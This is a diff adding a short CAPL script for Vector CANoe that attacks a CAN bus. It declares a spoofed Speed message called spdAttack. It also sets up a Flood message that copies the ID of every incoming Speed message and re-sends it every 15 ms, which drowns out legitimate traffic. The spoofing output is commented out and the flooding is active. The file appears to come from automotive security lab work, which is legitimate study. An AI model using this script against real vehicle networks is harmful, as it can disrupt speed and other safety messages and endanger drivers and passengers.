@@ -1,0 +1,33 @@
+﻿/*@!Encoding:65001*/
+includes
+{
+  
+}
+
+variables
+{
+  message CAN1::Speed spdAttack; // same ID
+  message 0x55 Temp; 
+  message 0x00 Flood;
+  msTimer myTimer;
+  msTimer timer_1ms;
+}
+on timer myTimer{
+  output(spdAttack);
+}
+on start{
+  //setTimer(myTimer, 20);
+  setTimer(timer_1ms,20);
+}
+
+on message Speed{
+  Flood.id = this.id;
+  //output(spdAttack);
+}
+on timer timer_1ms
+{
+  //Flood.DataLength=8;
+  //Flood.byte(8)=0x00;
+  output(Flood);
+  setTimer(timer_1ms,15);
+}
